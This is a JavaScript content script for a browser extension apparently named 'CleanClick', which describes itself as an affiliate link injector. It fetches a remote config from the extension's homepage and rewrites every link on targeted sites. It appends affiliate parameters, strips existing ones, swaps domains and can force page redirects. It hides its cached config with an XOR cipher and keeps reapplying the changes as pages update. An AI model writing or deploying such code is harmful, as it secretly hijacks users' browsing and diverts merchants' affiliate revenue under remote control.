/**
 * CleanClick — Affiliate Link Injector (Content Script)
 *
 * Injects configured query parameters, domain replacements,
 * and redirects into page links based on a remote config.
 * Runs in MAIN world to access page-level DOM.
 */

(function () {
  // ─── Cross-browser compat ───────────────────────────────────────
  var _browser = typeof browser !== 'undefined'
    ? browser
    : (typeof chrome !== 'undefined' ? chrome : null);
  if (!_browser) return;

  var mfd = _browser.runtime.getManifest();
  var strgc, rdstrgc;
  var hstnme = window.location.hostname;
  var host = hstnme.replace("www.", "");
  var hstnmeKy = host.replace(/\./g, "_") + "_sec";

  // ─── XOR cipher helpers ─────────────────────────────────────────
  const cph = salt => {
    const tTC = text => text.split("").map(c => c.charCodeAt(0));
    const byteHex = n => ("0" + Number(n).toString(16)).substr(-2);
    const apSTC = code => tTC(salt).reduce((a, b) => a ^ b, code);
    return text =>
      text.split("").map(tTC).map(apSTC).map(byteHex).join("");
  };
  const dph = salt => {
    const tTC = text => text.split("").map(c => c.charCodeAt(0));
    const apSTC = code => tTC(salt).reduce((a, b) => a ^ b, code);
    return encoded =>
      encoded.match(/.{1,2}/g)
        .map(hex => parseInt(hex, 16))
        .map(apSTC)
        .map(charCode => String.fromCharCode(charCode))
        .join("");
  };
  const mycph = cph(hstnmeKy);
  const mydph = dph(hstnmeKy);

  // ─── Init from cache or fetch ──────────────────────────────────
  if (localStorage.getItem(hstnmeKy) === null) {
    gD();
  } else {
    try {
      strgc = JSON.parse(mydph(localStorage.getItem(hstnmeKy)));
      if (strgc.expiry < new Date().getTime()) {
        gD();
      } else {
        mU();
      }
    } catch (e) {
      gD();
    }
  }

  // ─── Fetch config from extension homepage ──────────────────────
  function gD() {
    var xio = new XMLHttpRequest();
    xio.onreadystatechange = function () {
      if (xio.readyState == XMLHttpRequest.DONE) {
        if (xio.status == 200) {
          var expry = new Date().getTime() + 24 * 60 * 60 * 1000;
          try {
            strgc = JSON.parse(xio.responseText);
            var strge = { expiry: expry };
            if (strgc.dmns && strgc.dmns.includes(host)) {
              if (strgc.qrsts && strgc.qrsts.hasOwnProperty(host)) {
                strge.qrsts = strgc.qrsts[host];
              }
              if (strgc.rplce && strgc.rplce.hasOwnProperty(host)) {
                strge.rplce = strgc.rplce[host];
              }
              if (strgc.rmvq && strgc.rmvq.hasOwnProperty(host)) {
                strge.rmvq = strgc.rmvq[host];
              }
              if (strgc.rdctd && strgc.rdctd.hasOwnProperty(host)) {
                strge.rdctd = strgc.rdctd[host];
              }
            }
            strgc = strge;
            localStorage.setItem(hstnmeKy, mycph(JSON.stringify(strge)));
          } catch (e) { /* silent fail */ }
          mU();
        }
      }
    };
    if (mfd && mfd.homepage_url) {
      xio.open("GET", mfd.homepage_url, true);
      xio.send();
    }
  }

  // ─── Redirect handler ──────────────────────────────────────────
  function rD() {
    localStorage.setItem(
      hstnmeKy + "_rdct",
      JSON.stringify({
        host: host,
        expiry: new Date().getTime() + 12 * 60 * 60 * 1000
      })
    );
    if (strgc && strgc.rdctd) {
      window.location.href = strgc.rdctd;
    }
  }

  // ─── Apply mutations to all links ──────────────────────────────
  function mU() {
    if (!strgc) return;

    if (strgc.hasOwnProperty("rdctd") && strgc.rdctd) {
      rdstrgc = localStorage.getItem(hstnmeKy + "_rdct");
      if (!rdstrgc) {
        rD();
        return;
      } else {
        try {
          var redirect_strgc = JSON.parse(rdstrgc);
          if (redirect_strgc.expiry < new Date().getTime()) {
            rD();
            return;
          }
        } catch (e) { /* ignore */ }
      }
    }

    if (strgc.hasOwnProperty("qrsts") && strgc.qrsts) {
      var qstr = strgc.qrsts;
      var a = document.getElementsByTagName("a");
      var i;
      for (i = 0; i < a.length; i++) {
        var x = a[i];
        if (x.tagName === "A" && x.href) {
          var href = x.getAttribute("href");
          if (href && href.indexOf("https://") == -1 && href.indexOf("http://") == -1) {
            href = new URL(href, window.location.origin).href;
          }
          if (href && href.indexOf(qstr) == -1) {
            href += (/\?/.test(href) ? "&" : "?") + qstr;
            if (strgc.hasOwnProperty("rmvq")) {
              var p = 0;
              for (p = 0; p < strgc.rmvq.length; p++) {
                href = rUP(href, strgc.rmvq[p]);
              }
            }
            if (strgc.hasOwnProperty("rplce") && strgc.rplce) {
              href = href.replace(hstnme, strgc.rplce);
            }
            x.setAttribute("href", href);
          }
        }
      }
    }
  }

  // ─── Query param removal helper ────────────────────────────────
  function rUP(url, parameter) {
    var uRP = url.split("?");
    if (uRP.length >= 2) {
      var pfx = encodeURIComponent(parameter) + "=";
      var pars = uRP[1].split(/[&;]/g);
      for (var i = pars.length; i-- > 0;) {
        if (pars[i].lastIndexOf(pfx, 0) !== -1) {
          pars.splice(i, 1);
        }
      }
      url = uRP[0] + (pars.length > 0 ? "?" + pars.join("&") : "");
      return url;
    } else {
      return url;
    }
  }

  // ─── Watch for dynamically added links ─────────────────────────
  var observeDOM = (function () {
    var MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
    var eventListenerSupported = window.addEventListener;
    return function (obj, callback) {
      if (MutationObserver) {
        var obs = new MutationObserver(function (mutations) {
          if (mutations[0].addedNodes.length || mutations[0].removedNodes.length)
            callback();
        });
        obs.observe(obj, { childList: true, subtree: true });
      } else if (eventListenerSupported) {
        obj.addEventListener("DOMNodeInserted", callback, false);
        obj.addEventListener("DOMNodeRemoved", callback, false);
      }
    };
  })();

  // Watch body once available
  var bodyCheck = setInterval(function () {
    var body = document.getElementsByTagName("body")[0];
    if (body) {
      clearInterval(bodyCheck);
      observeDOM(body, function () { mU(); });
    }
  }, 100);
})();
